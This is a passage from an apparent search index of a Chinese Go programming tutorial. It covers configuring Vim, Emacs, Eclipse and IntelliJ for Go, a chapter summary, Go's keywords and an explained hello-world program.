pathogen\u662f\u4e3a\u4e86\u89e3\u51b3\u6bcf\u4e00\u4e2a\u63d2\u4ef6\u5b89\u88c5\u540e\u6587\u4ef6\u5206\u6563\u5230\u591a\u4e2a\u76ee\u5f55\u4e0d\u597d\u7ba1\u7406\u800c\u5b58\u5728\u7684\u3002vundle\u662f\u4e3a\u4e86\u89e3\u51b3\u81ea\u52a8\u641c\u7d22\u53ca\u4e0b\u8f7d\u63d2\u4ef6\u800c\u5b58\u5728\u7684\u3002 \u8fd9\u4e24\u4e2a\u63d2\u4ef6\u53ef\u540c\u65f6\u4f7f\u7528\u3002</p> <p>1.\u5b89\u88c5 Vundle</p> <pre><code>mkdir ~/.vim/bundle\ngit clone https://github.com/gmarik/Vundle.vim.git ~/.vim/bundle/Vundle.vim\n</code></pre> <p>\u4fee\u6539.vimrc\uff0c\u5c06Vundle\u7684\u76f8\u5173\u914d\u7f6e\u7f6e\u5728\u6700\u5f00\u59cb\u5904(\u8be6\u7ec6\u53c2\u8003Vundle\u7684\u4ecb\u7ecd\u6587\u6863)</p> <p><pre><code>set nocompatible              \" be iMproved, required\nfiletype off                  \" required\n\n\" set the runtime path to include Vundle and initialize\nset rtp+=~/.vim/bundle/Vundle.vim\ncall vundle#begin()\n\n\" let Vundle manage Vundle, required\nPlugin 'gmarik/Vundle.vim'\n\n\" All of your Plugins must be added before the following line\ncall vundle#end()            \" required\nfiletype plugin indent on    \" required\n</code></pre> 2.\u5b89\u88c5Vim-go</p> <p>\u4fee\u6539~/.vimrc\uff0c\u5728vundle#begin\u548cvundle#end\u95f4\u589e\u52a0\u4e00\u884c\uff1a</p> <pre><code>Plugin 'fatih/vim-go'\n</code></pre> <p>\u5728Vim\u5185\u6267\u884c: PluginInstall</p> <p>3.\u5b89\u88c5YCM(Your Complete Me)\u8fdb\u884c\u81ea\u52a8\u8865\u5168 \u5728~/.vimrc\u4e2d\u6dfb\u52a0\u4e00\u884c\uff1a <pre><code>Plugin 'Valloric/YouCompleteMe'\n</code></pre> \u5728Vim\u5185\u6267\u884c: PluginInstall</p> <p></p> <p>\u56fe1.9 VIM\u7f16\u8f91\u5668\u81ea\u52a8\u5316\u63d0\u793aGo\u754c\u9762</p> <p>\u63a5\u7740\u6211\u4eec\u7ee7\u7eed\u914d\u7f6evim:</p> <ol> <li> <p>\u914d\u7f6evim\u9ad8\u4eae\u663e\u793a</p> <pre><code>cp -r $GOROOT/misc/vim/* ~/.vim/\n</code></pre> </li> <li> <p>\u5728~/.vimrc\u6587\u4ef6\u4e2d\u589e\u52a0\u8bed\u6cd5\u9ad8\u4eae\u663e\u793a</p> <pre><code>filetype plugin indent on\nsyntax on\n</code></pre> </li> <li> <p>\u5b89\u88c5Gocode</p> <pre><code>go get -u github.com/nsf/gocode\n</code></pre> <p>gocode\u9ed8\u8ba4\u5b89\u88c5\u5230<code>$GOPATH/bin</code>\u4e0b\u9762\u3002</p> </li> <li> <p>\u914d\u7f6eGocode</p> <pre><code>~ cd $GOPATH/src/github.com/nsf/gocode/vim\n~ ./update.bash\n~ gocode set propose-builtins true\npropose-builtins true\n~ gocode set lib-path \"/home/border/gocode/pkg/linux_amd64\"\nlib-path \"/home/border/gocode/pkg/linux_amd64\"\n~ gocode set\npropose-builtins true\nlib-path \"/home/border/gocode/pkg/linux_amd64\"\n</code></pre> <p>gocode set\u91cc\u9762\u7684\u4e24\u4e2a\u53c2\u6570\u7684\u542b\u610f\u8bf4\u660e\uff1a</p> <p>propose-builtins\uff1a\u662f\u5426\u81ea\u52a8\u63d0\u793aGo\u7684\u5185\u7f6e\u51fd\u6570\u3001\u7c7b\u578b\u548c\u5e38\u91cf\uff0c\u9ed8\u8ba4\u4e3afalse\uff0c\u4e0d\u63d0\u793a\u3002</p> <p>lib-path:\u9ed8\u8ba4\u60c5\u51b5\u4e0b\uff0cgocode\u53ea\u4f1a\u641c\u7d22**\\(GOPATH/pkg/\\)GOOS_\\(GOARCH** \u548c **\\)GOROOT/pkg/\\(GOOS_\\)GOARCH**\u76ee\u5f55\u4e0b\u7684\u5305\uff0c\u5f53\u7136\u8fd9\u4e2a\u8bbe\u7f6e\u5c31\u662f\u53ef\u4ee5\u8bbe\u7f6e\u6211\u4eec\u989d\u5916\u7684lib\u80fd\u8bbf\u95ee\u7684\u8def\u5f84</p> </li> <li> <p>\u606d\u559c\u4f60\uff0c\u5b89\u88c5\u5b8c\u6210\uff0c\u4f60\u73b0\u5728\u53ef\u4ee5\u4f7f\u7528<code>:e main.go</code>\u4f53\u9a8c\u4e00\u4e0b\u5f00\u53d1Go\u7684\u4e50\u8da3\u3002</p> </li> </ol> <p>\u66f4\u591aVIM \u8bbe\u5b9a, \u53ef\u53c2\u8003\u94fe\u63a5</p>"},{"location":"01.4/#emacs","title":"Emacs","text":"<p>Emacs\u4f20\u8bf4\u4e2d\u7684\u795e\u5668\uff0c\u5979\u4e0d\u4ec5\u4ec5\u662f\u4e00\u4e2a\u7f16\u8f91\u5668\uff0c\u5b83\u662f\u4e00\u4e2a\u6574\u5408\u73af\u5883\uff0c\u6216\u53ef\u79f0\u5b83\u4e3a\u96c6\u6210\u5f00\u53d1\u73af\u5883\uff0c\u8fd9\u4e9b\u529f\u80fd\u5982\u8ba9\u4f7f\u7528\u8005\u7f6e\u8eab\u4e8e\u5168\u529f\u80fd\u7684\u64cd\u4f5c\u7cfb\u7edf\u4e2d\u3002</p> <p></p> <p>\u56fe1.10 Emacs\u7f16\u8f91Go\u4e3b\u754c\u9762</p> <ol> <li> <p>\u914d\u7f6eEmacs\u9ad8\u4eae\u663e\u793a</p> <pre><code>cp $GOROOT/misc/emacs/* ~/.emacs.d/\n</code></pre> </li> <li> <p>\u5b89\u88c5Gocode</p> <pre><code>go get -u github.com/nsf/gocode\n</code></pre> <p>gocode\u9ed8\u8ba4\u5b89\u88c5\u5230<code>$GOBIN</code>\u91cc\u9762\u4e0b\u9762\u3002</p> </li> <li> <p>\u914d\u7f6eGocode</p> <pre><code>~ cd $GOPATH/src/github.com/nsf/gocode/emacs\n~ cp go-autocomplete.el ~/.emacs.d/\n~ gocode set propose-builtins true\npropose-builtins true\n~ gocode set lib-path \"/home/border/gocode/pkg/linux_amd64\" // \u6362\u4e3a\u4f60\u81ea\u5df1\u7684\u8def\u5f84\nlib-path \"/home/border/gocode/pkg/linux_amd64\"\n~ gocode set\npropose-builtins true\nlib-path \"/home/border/gocode/pkg/linux_amd64\"\n</code></pre> </li> <li> <p>\u9700\u8981\u5b89\u88c5 Auto Completion</p> </li> </ol> <p>\u4e0b\u8f7dAutoComplete\u5e76\u89e3\u538b</p> <pre><code>~ make install DIR=$HOME/.emacs.d/auto-complete\n</code></pre> <p>\u914d\u7f6e~/.emacs\u6587\u4ef6</p> <pre><code>    ;;auto-complete\n    (require 'auto-complete-config)\n    (add-to-list 'ac-dictionary-directories \"~/.emacs.d/auto-complete/ac-dict\")\n    (ac-config-default)\n    (local-set-key (kbd \"M-/\") 'semantic-complete-analyze-inline)\n    (local-set-key \".\" 'semantic-complete-self-insert)\n    (local-set-key \"&gt;\" 'semantic-complete-self-insert)\n</code></pre> <p>\u8be6\u7ec6\u4fe1\u606f\u53c2\u8003: http://www.emacswiki.org/emacs/AutoComplete</p> <ol> <li> <p>\u914d\u7f6e.emacs</p> <pre><code>;; golang mode\n(require 'go-mode-load)\n(require 'go-autocomplete)\n;; speedbar\n;; (speedbar 1)\n(speedbar-add-supported-extension \".go\")\n(add-hook\n'go-mode-hook\n'(lambda ()\n    ;; gocode\n    (auto-complete-mode 1)\n    (setq ac-sources '(ac-source-go))\n    ;; Imenu &amp; Speedbar\n    (setq imenu-generic-expression\n        '((\"type\" \"^type *\\\\([^ \\t\\n\\r\\f]*\\\\)\" 1)\n        (\"func\" \"^func *\\\\(.*\\\\) {\" 1)))\n    (imenu-add-to-menubar \"Index\")\n    ;; Outline mode\n    (make-local-variable 'outline-regexp)\n    (setq outline-regexp \"//\\\\.\\\\|//[^\\r\\n\\f][^\\r\\n\\f]\\\\|pack\\\\|func\\\\|impo\\\\|cons\\\\|var.\\\\|type\\\\|\\t\\t*....\")\n    (outline-minor-mode 1)\n    (local-set-key \"\\M-a\" 'outline-previous-visible-heading)\n    (local-set-key \"\\M-e\" 'outline-next-visible-heading)\n    ;; Menu bar\n    (require 'easymenu)\n    (defconst go-hooked-menu\n        '(\"Go tools\"\n        [\"Go run buffer\" go t]\n        [\"Go reformat buffer\" go-fmt-buffer t]\n        [\"Go check buffer\" go-fix-buffer t]))\n    (easy-menu-define\n        go-added-menu\n        (current-local-map)\n        \"Go tools\"\n        go-hooked-menu)\n\n    ;; Other\n    (setq show-trailing-whitespace t)\n    ))\n;; helper function\n(defun go ()\n    \"run current buffer\"\n    (interactive)\n    (compile (concat \"go run \" (buffer-file-name))))\n\n;; helper function\n(defun go-fmt-buffer ()\n    \"run gofmt on current buffer\"\n    (interactive)\n    (if buffer-read-only\n    (progn\n        (ding)\n        (message \"Buffer is read only\"))\n    (let ((p (line-number-at-pos))\n    (filename (buffer-file-name))\n    (old-max-mini-window-height max-mini-window-height))\n        (show-all)\n        (if (get-buffer \"*Go Reformat Errors*\")\n    (progn\n        (delete-windows-on \"*Go Reformat Errors*\")\n        (kill-buffer \"*Go Reformat Errors*\")))\n        (setq max-mini-window-height 1)\n        (if (= 0 (shell-command-on-region (point-min) (point-max) \"gofmt\" \"*Go Reformat Output*\" nil \"*Go Reformat Errors*\" t))\n    (progn\n        (erase-buffer)\n        (insert-buffer-substring \"*Go Reformat Output*\")\n        (goto-char (point-min))\n        (forward-line (1- p)))\n    (with-current-buffer \"*Go Reformat Errors*\"\n    (progn\n        (goto-char (point-min))\n        (while (re-search-forward \"&lt;standard input&gt;\" nil t)\n        (replace-match filename))\n        (goto-char (point-min))\n        (compilation-mode))))\n        (setq max-mini-window-height old-max-mini-window-height)\n        (delete-windows-on \"*Go Reformat Output*\")\n        (kill-buffer \"*Go Reformat Output*\"))))\n;; helper function\n(defun go-fix-buffer ()\n    \"run gofix on current buffer\"\n    (interactive)\n    (show-all)\n    (shell-command-on-region (point-min) (point-max) \"go tool fix -diff\"))\n</code></pre> </li> <li> <p>\u606d\u559c\u4f60\uff0c\u4f60\u73b0\u5728\u53ef\u4ee5\u4f53\u9a8c\u5728\u795e\u5668\u4e2d\u5f00\u53d1Go\u7684\u4e50\u8da3\u3002\u9ed8\u8ba4speedbar\u662f\u5173\u95ed\u7684\uff0c\u5982\u679c\u6253\u5f00\u9700\u8981\u628a ;; (speedbar 1) \u524d\u9762\u7684\u6ce8\u91ca\u53bb\u6389\uff0c\u6216\u8005\u4e5f\u53ef\u4ee5\u901a\u8fc7 M-x speedbar \u624b\u52a8\u5f00\u542f\u3002</p> </li> </ol>"},{"location":"01.4/#eclipse","title":"Eclipse","text":"<p>Eclipse\u4e5f\u662f\u975e\u5e38\u5e38\u7528\u7684\u5f00\u53d1\u5229\u5668\uff0c\u4ee5\u4e0b\u4ecb\u7ecd\u5982\u4f55\u4f7f\u7528Eclipse\u6765\u7f16\u5199Go\u7a0b\u5e8f\u3002</p> <p></p> <p>\u56fe1.11 Eclipse\u7f16\u8f91Go\u7684\u4e3b\u754c\u9762</p> <ol> <li> <p>\u9996\u5148\u4e0b\u8f7d\u5e76\u5b89\u88c5\u597dEclipse</p> </li> <li> <p>\u4e0b\u8f7dgoclipse\u63d2\u4ef6</p> <p>http://code.google.com/p/goclipse/wiki/InstallationInstructions</p> </li> <li> <p>\u4e0b\u8f7dgocode\uff0c\u7528\u4e8ego\u7684\u4ee3\u7801\u8865\u5168\u63d0\u793a</p> <p>gocode\u7684GitHub\u5730\u5740\uff1a</p> <pre><code>https://github.com/nsf/gocode\n</code></pre> <p>\u5728windows\u4e0b\u8981\u5b89\u88c5git\uff0c\u901a\u5e38\u7528msysgit</p> <p>\u518d\u5728cmd\u4e0b\u5b89\u88c5\uff1a</p> <pre><code>go get -u github.com/nsf/gocode\n</code></pre> <p>\u4e5f\u53ef\u4ee5\u4e0b\u8f7d\u4ee3\u7801\uff0c\u76f4\u63a5\u7528go build\u6765\u7f16\u8bd1\uff0c\u4f1a\u751f\u6210gocode.exe</p> </li> <li> <p>\u4e0b\u8f7dMinGW\u5e76\u6309\u8981\u6c42\u88c5\u597d</p> </li> <li> <p>\u914d\u7f6e\u63d2\u4ef6</p> <p>Windows-&gt;Reference-&gt;Go</p> </li> </ol> <p>(1).\u914d\u7f6eGo\u7684\u7f16\u8bd1\u5668</p> <p></p> <p>\u56fe1.12 \u8bbe\u7f6eGo\u7684\u4e00\u4e9b\u57fa\u7840\u4fe1\u606f</p> <p>(2).\u914d\u7f6eGocode\uff08\u53ef\u9009\uff0c\u4ee3\u7801\u8865\u5168\uff09\uff0c\u8bbe\u7f6eGocode\u8def\u5f84\u4e3a\u4e4b\u524d\u751f\u6210\u7684gocode.exe\u6587\u4ef6</p> <p></p> <p>\u56fe1.13 \u8bbe\u7f6egocode\u4fe1\u606f</p> <p>(3).\u914d\u7f6eGDB\uff08\u53ef\u9009\uff0c\u505a\u8c03\u8bd5\u7528\uff09\uff0c\u8bbe\u7f6eGDB\u8def\u5f84\u4e3aMingW\u5b89\u88c5\u76ee\u5f55\u4e0b\u7684gdb.exe\u6587\u4ef6</p> <p></p> <p>\u56fe1.14 \u8bbe\u7f6eGDB\u4fe1\u606f</p> <ol> <li> <p>\u6d4b\u8bd5\u662f\u5426\u6210\u529f</p> <p>\u65b0\u5efa\u4e00\u4e2ago\u5de5\u7a0b\uff0c\u518d\u5efa\u7acb\u4e00\u4e2ahello.go\u3002\u5982\u4e0b\u56fe\uff1a</p> <p></p> <p>\u56fe1.15 \u65b0\u5efa\u9879\u76ee\u7f16\u8f91\u6587\u4ef6</p> <p>\u8c03\u8bd5\u5982\u4e0b\uff08\u8981\u5728console\u4e2d\u7528\u8f93\u5165\u547d\u4ee4\u6765\u8c03\u8bd5\uff09\uff1a</p> <p></p> <p>\u56fe1.16 \u8c03\u8bd5Go\u7a0b\u5e8f</p> </li> </ol>"},{"location":"01.4/#intellij-idea","title":"IntelliJ IDEA","text":"<p>\u719f\u6089Java\u7684\u8bfb\u8005\u5e94\u8be5\u5bf9\u4e8eidea\u4e0d\u964c\u751f\uff0cidea\u662f\u901a\u8fc7\u4e00\u4e2a\u63d2\u4ef6\u6765\u652f\u6301go\u8bed\u8a00\u7684\u9ad8\u4eae\u8bed\u6cd5,\u4ee3\u7801\u63d0\u793a\u548c\u91cd\u6784\u5b9e\u73b0\u3002</p> <ol> <li> <p>\u5148\u4e0b\u8f7didea\uff0cidea\u652f\u6301\u591a\u5e73\u53f0\uff1awin,mac,linux\uff0c\u5982\u679c\u6709\u94b1\u5c31\u4e70\u4e2a\u6b63\u5f0f\u7248\uff0c\u5982\u679c\u4e0d\u884c\u5c31\u4f7f\u7528\u793e\u533a\u514d\u8d39\u7248\uff0c\u5bf9\u4e8e\u53ea\u662f\u5f00\u53d1Go\u8bed\u8a00\u6765\u8bf4\u514d\u8d39\u7248\u8db3\u591f\u7528\u4e86</p> <p></p> </li> <li> <p>\u5b89\u88c5Go\u63d2\u4ef6\uff0c\u70b9\u51fb\u83dc\u5355File\u4e2d\u7684Setting\uff0c\u627e\u5230Plugins,\u70b9\u51fb,Broswer repo\u6309\u94ae\u3002\u56fd\u5185\u7684\u7528\u6237\u53ef\u80fd\u4f1a\u62a5\u9519\uff0c\u81ea\u5df1\u89e3\u51b3\u54c8\u3002</p> <p></p> </li> <li> <p>\u8fd9\u65f6\u5019\u4f1a\u770b\u89c1\u5f88\u591a\u63d2\u4ef6\uff0c\u641c\u7d22\u627e\u5230Golang,\u53cc\u51fb,download and install\u3002\u7b49\u5230golang\u90a3\u4e00\u884c\u540e\u9762\u51fa\u73b0Downloaded\u6807\u5fd7\u540e,\u70b9OK\u3002</p> <p></p> <p>\u7136\u540e\u70b9 Apply .\u8fd9\u65f6\u5019IDE\u4f1a\u8981\u6c42\u4f60\u91cd\u542f\u3002</p> </li> <li> <p>\u91cd\u542f\u5b8c\u6bd5\u540e,\u521b\u5efa\u65b0\u9879\u76ee\u4f1a\u53d1\u73b0\u5df2\u7ecf\u53ef\u4ee5\u521b\u5efagolang\u9879\u76ee\u4e86\uff1a</p> <p></p> <p>\u4e0b\u4e00\u6b65,\u4f1a\u8981\u6c42\u4f60\u8f93\u5165 go sdk\u7684\u4f4d\u7f6e,\u4e00\u822c\u90fd\u5b89\u88c5\u5728C:\\Go\uff0clinux\u548cmac\u6839\u636e\u81ea\u5df1\u7684\u5b89\u88c5\u76ee\u5f55\u8bbe\u7f6e\uff0c\u9009\u4e2d\u76ee\u5f55\u786e\u5b9a,\u5c31\u53ef\u4ee5\u4e86\u3002</p> </li> </ol>"},{"location":"01.4/#links","title":"links","text":"<ul> <li>\u76ee\u5f55</li> <li>\u4e0a\u4e00\u8282: Go \u547d\u4ee4</li> <li>\u4e0b\u4e00\u8282: \u603b\u7ed3</li> </ul>"},{"location":"01.5/","title":"1.5 \u603b\u7ed3","text":"<p>\u8fd9\u4e00\u7ae0\u4e2d\u6211\u4eec\u4e3b\u8981\u4ecb\u7ecd\u4e86\u5982\u4f55\u5b89\u88c5Go\uff0cGo\u53ef\u4ee5\u901a\u8fc7\u4e09\u79cd\u65b9\u5f0f\u5b89\u88c5\uff1a\u6e90\u7801\u5b89\u88c5\u3001\u6807\u51c6\u5305\u5b89\u88c5\u3001\u7b2c\u4e09\u65b9\u5de5\u5177\u5b89\u88c5\uff0c\u5b89\u88c5\u4e4b\u540e\u6211\u4eec\u9700\u8981\u914d\u7f6e\u6211\u4eec\u7684\u5f00\u53d1\u73af\u5883\uff0c\u7136\u540e\u4ecb\u7ecd\u4e86\u5982\u4f55\u914d\u7f6e\u672c\u5730\u7684<code>$GOPATH</code>\uff0c\u901a\u8fc7\u8bbe\u7f6e<code>$GOPATH</code>\u4e4b\u540e\u8bfb\u8005\u5c31\u53ef\u4ee5\u521b\u5efa\u9879\u76ee\uff0c\u63a5\u7740\u4ecb\u7ecd\u4e86\u5982\u4f55\u6765\u8fdb\u884c\u9879\u76ee\u7f16\u8bd1\u3001\u5e94\u7528\u5b89\u88c5\u7b49\u95ee\u9898\uff0c\u8fd9\u4e9b\u9700\u8981\u7528\u5230\u5f88\u591aGo\u547d\u4ee4\uff0c\u6240\u4ee5\u63a5\u7740\u5c31\u4ecb\u7ecd\u4e86\u4e00\u4e9bGo\u7684\u5e38\u7528\u547d\u4ee4\u5de5\u5177\uff0c\u5305\u62ec\u7f16\u8bd1\u3001\u5b89\u88c5\u3001\u683c\u5f0f\u5316\u3001\u6d4b\u8bd5\u7b49\u547d\u4ee4\uff0c\u6700\u540e\u4ecb\u7ecd\u4e86Go\u7684\u5f00\u53d1\u5de5\u5177\uff0c\u76ee\u524d\u6709\u5f88\u591aGo\u7684\u5f00\u53d1\u5de5\u5177\uff1aLiteIDE\u3001Sublime\u3001VSCode\u3001Atom\u3001Goland\u3001VIM\u3001Emacs\u3001Eclipse\u3001Idea\u7b49\u5de5\u5177\uff0c\u8bfb\u8005\u53ef\u4ee5\u6839\u636e\u81ea\u5df1\u719f\u6089\u7684\u5de5\u5177\u8fdb\u884c\u914d\u7f6e\uff0c\u5e0c\u671b\u80fd\u591f\u901a\u8fc7\u65b9\u4fbf\u7684\u5de5\u5177\u5feb\u901f\u7684\u5f00\u53d1Go\u5e94\u7528\u3002</p>"},{"location":"01.5/#links","title":"links","text":"<ul> <li>\u76ee\u5f55</li> <li>\u4e0a\u4e00\u8282: Go\u5f00\u53d1\u5de5\u5177</li> <li>\u4e0b\u4e00\u7ae0: Go\u8bed\u8a00\u57fa\u7840</li> </ul>"},{"location":"02.0/","title":"2 Go\u8bed\u8a00\u57fa\u7840","text":"<p>Go\u662f\u4e00\u95e8\u7c7b\u4f3cC\u7684\u7f16\u8bd1\u578b\u8bed\u8a00\uff0c\u4f46\u662f\u5b83\u7684\u7f16\u8bd1\u901f\u5ea6\u975e\u5e38\u5feb\u3002\u8fd9\u95e8\u8bed\u8a00\u7684\u5173\u952e\u5b57\u603b\u5171\u4e5f\u5c31\u4e8c\u5341\u4e94\u4e2a\uff0c\u6bd4\u82f1\u6587\u5b57\u6bcd\u8fd8\u5c11\u4e00\u4e2a\uff0c\u8fd9\u5bf9\u4e8e\u6211\u4eec\u7684\u5b66\u4e60\u6765\u8bf4\u5c31\u7b80\u5355\u4e86\u5f88\u591a\u3002\u5148\u8ba9\u6211\u4eec\u770b\u4e00\u773c\u8fd9\u4e9b\u5173\u952e\u5b57\u90fd\u957f\u4ec0\u4e48\u6837\uff1a</p> <pre><code>break    default      func    interface    select\ncase     defer        go      map          struct\nchan     else         goto    package      switch\nconst    fallthrough  if      range        type\ncontinue for          import  return       var\n</code></pre> <p>\u5728\u63a5\u4e0b\u6765\u7684\u8fd9\u4e00\u7ae0\u4e2d\uff0c\u6211\u5c06\u5e26\u9886\u4f60\u53bb\u5b66\u4e60\u8fd9\u95e8\u8bed\u8a00\u7684\u57fa\u7840\u3002\u901a\u8fc7\u6bcf\u4e00\u5c0f\u8282\u7684\u4ecb\u7ecd\uff0c\u4f60\u5c06\u53d1\u73b0\uff0cGo\u7684\u4e16\u754c\u662f\u90a3\u4e48\u5730\u7b80\u6d01\uff0c\u8bbe\u8ba1\u662f\u5982\u6b64\u5730\u7f8e\u5999\uff0c\u7f16\u5199Go\u5c06\u4f1a\u662f\u4e00\u4ef6\u6109\u5feb\u7684\u4e8b\u60c5\u3002\u7b49\u56de\u8fc7\u5934\u6765\uff0c\u4f60\u5c31\u4f1a\u53d1\u73b0\u8fd9\u4e8c\u5341\u4e94\u4e2a\u5173\u952e\u5b57\u662f\u591a\u4e48\u5730\u4eb2\u5207\u3002</p>"},{"location":"02.0/#_1","title":"\u76ee\u5f55","text":""},{"location":"02.0/#links","title":"links","text":"<ul> <li>\u76ee\u5f55</li> <li>\u4e0a\u4e00\u7ae0: \u7b2c\u4e00\u7ae0\u603b\u7ed3</li> <li>\u4e0b\u4e00\u8282: \u4f60\u597d\uff0cGo</li> </ul>"},{"location":"02.1/","title":"2.1 \u4f60\u597d\uff0cGo","text":"<p>\u5728\u5f00\u59cb\u7f16\u5199\u5e94\u7528\u4e4b\u524d\uff0c\u6211\u4eec\u5148\u4ece\u6700\u57fa\u672c\u7684\u7a0b\u5e8f\u5f00\u59cb\u3002\u5c31\u50cf\u4f60\u9020\u623f\u5b50\u4e4b\u524d\u4e0d\u77e5\u9053\u4ec0\u4e48\u662f\u5730\u57fa\u4e00\u6837\uff0c\u7f16\u5199\u7a0b\u5e8f\u4e5f\u4e0d\u77e5\u9053\u5982\u4f55\u5f00\u59cb\u3002\u56e0\u6b64\uff0c\u5728\u672c\u8282\u4e2d\uff0c\u6211\u4eec\u8981\u5b66\u4e60\u7528\u6700\u57fa\u672c\u7684\u8bed\u6cd5\u8ba9Go\u7a0b\u5e8f\u8fd0\u884c\u8d77\u6765\u3002</p>"},{"location":"02.1/#_1","title":"\u7a0b\u5e8f","text":"<p>\u8fd9\u5c31\u50cf\u4e00\u4e2a\u4f20\u7edf\uff0c\u5728\u5b66\u4e60\u5927\u90e8\u5206\u8bed\u8a00\u4e4b\u524d\uff0c\u4f60\u5148\u5b66\u4f1a\u5982\u4f55\u7f16\u5199\u4e00\u4e2a\u53ef\u4ee5\u8f93\u51fa<code>hello world</code>\u7684\u7a0b\u5e8f\u3002</p> <p>\u51c6\u5907\u597d\u4e86\u5417\uff1fLet's Go! <pre><code>package main\n\nimport \"fmt\"\n\nfunc main() {\nfmt.Printf(\"Hello, world or \u4f60\u597d\uff0c\u4e16\u754c or \u03ba\u03b1\u03bb\u03b7\u03bc \u0301\u03c1\u03b1 \u03ba\u00f3\u03c3\u03bc or \u3053\u3093\u306b\u3061\u306f\u305b\u304b\u3044\\n\")\n}\n</code></pre> \u8f93\u51fa\u5982\u4e0b\uff1a</p> <pre><code>Hello, world or \u4f60\u597d\uff0c\u4e16\u754c or \u03ba\u03b1\u03bb\u03b7\u03bc \u0301\u03c1\u03b1 \u03ba\u00f3\u03c3\u03bc or \u3053\u3093\u306b\u3061\u306f\u305b\u304b\u3044\n</code></pre>"},{"location":"02.1/#_2","title":"\u8be6\u89e3","text":"<p>\u9996\u5148\u6211\u4eec\u8981\u4e86\u89e3\u4e00\u4e2a\u6982\u5ff5\uff0cGo\u7a0b\u5e8f\u662f\u901a\u8fc7<code>package</code>\u6765\u7ec4\u7ec7\u7684</p> <p><code>package &lt;pkgName&gt;</code>\uff08\u5728\u6211\u4eec\u7684\u4f8b\u5b50\u4e2d\u662f<code>package main</code>\uff09\u8fd9\u4e00\u884c\u544a\u8bc9\u6211\u4eec\u5f53\u524d\u6587\u4ef6\u5c5e\u4e8e\u54ea\u4e2a\u5305\uff0c\u800c\u5305\u540d<code>main</code>\u5219\u544a\u8bc9\u6211\u4eec\u5b83\u662f\u4e00\u4e2a\u53ef\u72ec\u7acb\u8fd0\u884c\u7684\u5305\uff0c\u5b83\u5728\u7f16\u8bd1\u540e\u4f1a\u4ea7\u751f\u53ef\u6267\u884c\u6587\u4ef6\u3002\u9664\u4e86<code>main</code>\u5305\u4e4b\u5916\uff0c\u5176\u5b83\u7684\u5305\u6700\u540e\u90fd\u4f1a\u751f\u6210<code>*.a</code>\u6587\u4ef6\uff08\u4e5f\u5c31\u662f\u5305\u6587\u4ef6\uff09\u5e76\u653e\u7f6e\u5728<code>$GOPATH/pkg/$GOOS_$GOARCH</code>\u4e2d\uff08\u4ee5Mac\u4e3a\u4f8b\u5c31\u662f<code>$GOPATH/pkg/darwin_amd64</code>\uff09\u3002</p> <p>\u6bcf\u4e00\u4e2a\u53ef\u72ec\u7acb\u8fd0\u884c\u7684Go\u7a0b\u5e8f\uff0c\u5fc5\u5b9a\u5305\u542b\u4e00\u4e2a<code>package main</code>\uff0c\u5728\u8fd9\u4e2a<code>main</code>\u5305\u4e2d\u5fc5\u5b9a\u5305\u542b\u4e00\u4e2a\u5165\u53e3\u51fd\u6570<code>main</code>\uff0c\u800c\u8fd9\u4e2a\u51fd\u6570\u65e2\u6ca1\u6709\u53c2\u6570\uff0c\u4e5f\u6ca1\u6709\u8fd4\u56de\u503c\u3002</p> <p>\u4e3a\u4e86\u6253\u5370<code>Hello, world...</code>\uff0c\u6211\u4eec\u8c03\u7528\u4e86\u4e00\u4e2a\u51fd\u6570<code>Printf</code>\uff0c\u8fd9\u4e2a\u51fd\u6570\u6765\u81ea\u4e8e<code>fmt</code>\u5305\uff0c\u6240\u4ee5\u6211\u4eec\u5728\u7b2c\u4e09\u884c\u4e2d\u5bfc\u5165\u4e86\u7cfb\u7edf\u7ea7\u522b\u7684<code>fmt</code>\u5305\uff1a<code>import \"fmt\"</code>\u3002</p> <p>\u5305\u7684\u6982\u5ff5\u548cPython\u4e2d\u7684package\u7c7b\u4f3c\uff0c\u5b83\u4eec\u90fd\u6709\u4e00\u4e9b\u7279\u522b\u7684\u597d\u5904\uff1a\u6a21\u5757\u5316\uff08\u80fd\u591f\u628a\u4f60\u7684\u7a0b\u5e8f\u5206\u6210\u591a\u4e2a\u6a21\u5757)\u548c\u53ef\u91cd\u7528\u6027\uff08\u6bcf\u4e2a\u6a21\u5757\u90fd\u80fd\u88ab\u5176\u5b83\u5e94\u7528\u7a0b\u5e8f\u53cd\u590d\u4f7f\u7528\uff09\u3002\u6211\u4eec\u5728\u8fd9\u91cc\u53ea\u662f\u5148\u4e86\u89e3\u4e00\u4e0b\u5305\u7684\u6982\u5ff5\uff0c\u540e\u9762\u6211\u4eec\u5c06\u4f1a\u7f16\u5199\u81ea\u5df1\u7684\u5305\u3002</p> <p>\u5728\u7b2c\u4e94\u884c\u4e2d\uff0c\u6211\u4eec\u901a\u8fc7\u5173\u952e\u5b57<code>func</code>\u5b9a\u4e49\u4e86\u4e00\u4e2a<code>main</code>\u51fd\u6570\uff0c\u51fd\u6570\u4f53\u88ab\u653e\u5728<code>{}</code>\uff08\u5927\u62ec\u53f7\uff09\u4e2d\uff0c\u5c31\u50cf\u6211\u4eec\u5e73\u65f6\u5199C\u3001C++\u6216Java\u65f6\u4e00\u6837\u3002</p> <p>\u5927\u5bb6\u53ef\u4ee5\u770b\u5230<code>main</code>\u51fd\u6570\u662f\u6ca1\u6709\u4efb\u4f55\u7684\u53c2\u6570\u7684\uff0c\u6211\u4eec\u63a5\u4e0b\u6765\u5c31\u5b66\u4e60\u5982\u4f55\u7f16\u5199\u5e26\u53c2\u6570\u7684\u3001\u8fd4\u56de0\u4e2a\u6216\u591a\u4e2a\u503c\u7684\u51fd\u6570\u3002</p> <p>\u7b2c\u516d\u884c\uff0c\u6211\u4eec\u8c03\u7528\u4e86<code>fmt</code>\u5305\u91cc\u9762\u5b9a\u4e49\u7684\u51fd\u6570<code>Printf</code>\u3002\u5927\u5bb6\u53ef\u4ee5\u770b\u5230\uff0c\u8fd9\u4e2a\u51fd\u6570\u662f\u901a\u8fc7<code>&lt;pkgName&gt;.&lt;funcName&gt;</code>\u7684\u65b9\u5f0f\u8c03\u7528\u7684\uff0c\u8fd9\u4e00\u70b9\u548cPython\u5341\u5206\u76f8\u4f3c\u3002</p> <p>\u524d\u9762\u63d0\u5230\u8fc7\uff0c\u5305\u540d\u548c\u5305\u6240\u5728\u7684\u6587\u4ef6\u5939\u540d\u53ef\u4ee5\u662f\u4e0d\u540c\u7684\uff0c\u6b64\u5904\u7684<code>&lt;pkgName&gt;</code>\u5373\u4e3a\u901a\u8fc7<code>package &lt;pkgName&gt;</code>\u58f0\u660e\u7684\u5305\u540d\uff0c\u800c\u975e\u6587\u4ef6\u5939\u540d\u3002</p> 